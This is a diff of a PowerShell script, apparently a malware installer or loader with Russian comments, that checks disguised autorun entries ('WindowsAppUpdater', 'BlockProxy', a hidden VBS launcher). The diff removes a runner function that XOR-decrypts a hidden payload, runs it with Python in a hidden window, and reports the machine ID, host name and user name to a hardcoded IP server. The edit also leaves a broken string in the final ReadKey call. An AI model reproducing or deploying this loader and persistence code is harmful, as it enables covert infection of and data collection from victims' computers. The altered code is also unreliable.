@@ -134,10 +134,8 @@ function tProc {
 
 function tRun {
     param([string]$n)
-    
+
     $rp = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
-    
-    # 1. Проверка реестра (основное имя)
     try {
         $v = Get-ItemProperty $rp -Name $n -ErrorAction Stop
         if ($v.$n) {
@@ -145,8 +143,7 @@ function tRun {
             return $true
         }
     } catch {}
-    
-    # 2. Проверка планировщика задач (основное имя)
+
     try {
         $task = Get-ScheduledTask -TaskName $n -ErrorAction Stop
         if ($task) {
@@ -154,8 +151,7 @@ function tRun {
             return $true
         }
     } catch {}
-    
-    # 3. Альтернативные имена в планировщике
+
     $possibleTaskNames = @(
         "MyAutoRunTask",
         "WindowsAppUpdater_VBS",
@@ -165,7 +161,7 @@ function tRun {
         "BlockProxy",
         "BlockProxyLogon"
     )
-    
+
     foreach ($taskName in $possibleTaskNames) {
         try {
             $task = Get-ScheduledTask -TaskName $taskName -ErrorAction Stop
@@ -175,42 +171,39 @@ function tRun {
             }
         } catch {}
     }
-    
-    # 4. Проверка VBS файла
+
     $vbsPath = "$env:LOCALAPPDATA\Microsoft\WindowsApps\launcher.vbs"
     if (Test-Path $vbsPath) {
         lInfo "VBS launcher exists" @{ path = $vbsPath }
         return $true
     }
-    
-    # 5. Проверка папки автозагрузки
+
     $startupFolder = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
     $possibleFiles = @(
         "$startupFolder\WindowsAppUpdater.lnk",
         "$startupFolder\WindowsAppUpdater_VBS.lnk",
         "$startupFolder\Updater.lnk"
     )
-    
+
     foreach ($file in $possibleFiles) {
         if (Test-Path $file) {
             lInfo "Autorun configured (Startup folder)" @{ path = $file }
             return $true
         }
     }
-    
-    # 6. Альтернативные имена в реестре
+
     $possibleNames = @("WindowsAppUpdater", "WindowsAppUpdater_VBS", "WindowsAppUpdater_CMD", "Updater", "WindowsUpdater")
     foreach ($name in $possibleNames) {
         if ($name -eq $n) { continue }
         try {
             $v = Get-ItemProperty $rp -Name $name -ErrorAction Stop
             if ($v.$name) {
-                lInfo "Alternative autorun found (Registry)" @{ name = $name; command = $v.$name }
+                lInfo "Alternative autorun found" @{ name = $name; command = $v.$name }
                 return $true
             }
         } catch {}
     }
-    
+
     lErr "Autorun missing" @{ expectedName = $n }
     return $false
 }
@@ -272,75 +265,7 @@ function Install-PythonLikeInstaller {
     }
 }
 
-function Create-RunnerFile {
-    param([string]$Path)
-    
-    $runnerCode = @'
-$ErrorActionPreference = 'SilentlyContinue'
-$pf = "$env:APPDATA\Microsoft\Security\payload.enc"
-$kf = "$env:LOCALAPPDATA\Microsoft\Vault\.token"
-
-$machineId = [BitConverter]::ToString(
-    [Security.Cryptography.MD5]::Create().ComputeHash(
-        [Text.Encoding]::UTF8.GetBytes("$($env:COMPUTERNAME)-$($env:USERNAME)".ToLower())
-    )
-).Replace('-','').Substring(0,16).ToLower()
-
-function Send-Log {
-    param([string]$Type, [string]$Message, [hashtable]$Extra = @{})
-    try {
-        $json = @{
-            timestamp = (Get-Date).ToString("o")
-            type = $Type
-            message = $Message
-            stage = "runner"
-            odId = $machineId
-            pcName = $env:COMPUTERNAME
-            pcUser = $env:USERNAME
-        }
-        if ($Extra.Count -gt 0) { $Extra.Keys | ForEach-Object { $json[$_] = $Extra[$_] } }
-        $body = $json | ConvertTo-Json -Compress
-        $wc = New-Object Net.WebClient
-        $wc.Proxy = [Net.GlobalProxySelection]::GetEmptyWebProxy()
-        $wc.Headers.Add("Content-Type", "application/json")
-        $null = $wc.UploadString("http://72.56.41.207:3000/api/log", $body)
-    } catch {}
-}
-
-try {
-    if (Test-Path $pf -and Test-Path $kf) {
-        $k = [IO.File]::ReadAllText($kf).Trim()
-        $e = [IO.File]::ReadAllText($pf).Trim()
-        $b = [Convert]::FromBase64String($e)
-        $kb = [Text.Encoding]::UTF8.GetBytes($k)
-        $r = New-Object byte[] $b.Length
-        for ($i = 0; $i -lt $b.Length; $i++) { $r[$i] = $b[$i] -bxor $kb[$i % $kb.Length] }
-        
-        if ($r[0] -eq 0x50 -and $r[1] -eq 0x4B) {
-            $tempFile = "$env:TEMP\payload.pyz"
-            [IO.File]::WriteAllBytes($tempFile, $r)
-            
-            $python = Get-Command python -ErrorAction SilentlyContinue
-            if ($python) {
-                Start-Process -FilePath $python.Source -ArgumentList "$tempFile" -WindowStyle Hidden
-                Send-Log -Type "info" -Message "Payload started"
-            }
-        }
-    }
-} catch {
-    Send-Log -Type "error" -Message "Runner error: $($_.Exception.Message)"
-}
-'@
-
-    try {
-        [IO.File]::WriteAllText($Path, $runnerCode, [Text.UTF8Encoding]::new($false))
-        lAction "Runner file created" @{path=$Path}
-        return $true
-    } catch {
-        lErr "Failed to create runner" @{error=$_.Exception.Message}
-        return $false
-    }
-}
+# ===== ФУНКЦИЯ Create-RunnerFile УДАЛЕНА =====
 
 function Add-AutoRun {
     param([string]$n, [string]$rf)
@@ -435,10 +360,11 @@ function chk {
         $installed = $true
     }
     
+    # ===== УДАЛЕНА УСТАНОВКА RUNNER ЧЕРЕЗ Create-RunnerFile =====
+    # Теперь просто проверяем наличие runner файла, но НЕ создаем его
     if (-not $r.rf) {
-        Write-Host "  [*] Creating runner script..." -ForegroundColor Yellow
-        $r.rf = Create-RunnerFile -Path $rFile
-        if ($r.rf) { $installed = $true }
+        Write-Host "  [*] Runner script not found, skipping creation..." -ForegroundColor Yellow
+        # Не создаем runner, просто пропускаем
     }
     
     if (-not $r.ar -and $r.rf) {
@@ -514,7 +440,7 @@ function chk {
     Write-Host "  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━" -ForegroundColor DarkGray
     Write-Host ""
     Write-Host "  Press any key to exit..." -ForegroundColor Gray
-    $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
+    $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown)
 }
 
 chk
